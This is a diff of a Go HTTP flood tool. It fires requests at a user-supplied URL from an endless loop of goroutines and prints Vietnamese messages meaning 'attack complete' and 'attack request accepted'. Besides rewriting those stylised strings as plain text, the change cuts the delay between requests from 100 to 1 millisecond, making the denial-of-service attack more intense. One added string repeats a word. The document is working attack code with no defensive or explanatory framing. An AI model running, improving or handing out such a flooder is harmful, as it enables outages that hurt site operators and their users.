@@ -70,9 +70,9 @@ func get() {
 	atomic.AddUint64(&reqCount, 1) // increment
 
 	if os.IsTimeout(err) {
-		color.Red.Println("𝑯𝒐𝒂̀𝒏 𝒕𝒉𝒂̀𝒏𝒉 𝒕𝒂̂́𝒏 𝒄𝒐̂𝒏𝒈")
+		color.Red.Println("Hoàn Thành Tấn Công")
 	} else {
-		color.Green.Println("𝑪𝒉𝒂̂́𝒑 𝒏𝒉𝒂̣̂𝒏 𝒚𝒆̂𝒖 𝒄𝒂̂̀𝒖 𝒕𝒂̂́𝒏 𝒄𝒐̂𝒏𝒈")
+		color.Green.Println("Chấp nhận yêu cầu tấn côngcông")
 	}
 
 	if err != nil {
@@ -85,18 +85,18 @@ func get() {
 func loop() {
 	for {
 		go get()
-		time.Sleep(100 * time.Millisecond) // sleep before sending request again
+		time.Sleep(1 * time.Millisecond) // sleep before sending request again
 	}
 }
 
 func main() {
-	color.Cyan.Println("𝐑𝐨𝐨𝐭 𝐁𝐲 𝐍𝐠𝐮𝐲𝐞̂̃𝐧 𝐓𝐡𝐚̀𝐧𝐡 𝐕𝐢𝐧𝐡")
+	color.Cyan.Println("𝐑𝐨𝐨𝐭 𝐁𝐲 NgThanhVinh")
 
 	flag.StringVar(&hostname, "url", "", "example: --url https://example.com")
 	flag.Parse()
 
 	if len(hostname) == 0 {
-		color.Red.Println("𝙏𝙝𝙞𝙚̂́𝙪 𝙩𝙚̂𝙣 𝙢𝙖́𝙮 𝙘𝙝𝙪̉.")
+		color.Red.Println("Thiếu tên máy chủ.")
 		color.Blue.Println("Example usage:\n\t ./root --url https://example.com")
 		os.Exit(1)
 	}
